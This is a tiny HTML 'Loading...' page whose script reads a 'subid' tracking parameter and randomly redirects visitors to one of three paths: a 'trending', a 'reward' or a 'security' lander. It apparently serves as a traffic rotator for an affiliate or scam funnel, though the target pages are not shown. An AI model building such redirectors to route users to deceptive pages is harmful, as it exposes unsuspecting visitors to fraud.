<!DOCTYPE html>
<html>
<head>
<title>Loading...</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>

<body>

<script>
// GET PARAMS
let params = new URLSearchParams(window.location.search);

// GET subid DIRECTLY
let subid = params.get("subid");

// fallback
if (!subid) {
  subid = "no_subid";
}

// ROTATION
let paths = [
  "/f1_trending/",
  "/f1_trending/",
  "/f1_trending/",
  "/f2_reward/",
  "/f3_security/"
];

let path = paths[Math.floor(Math.random() * paths.length)];

// PASS IT MANUALLY
window.location.replace(path + "?subid=" + subid);
</script>
</body>
</html>
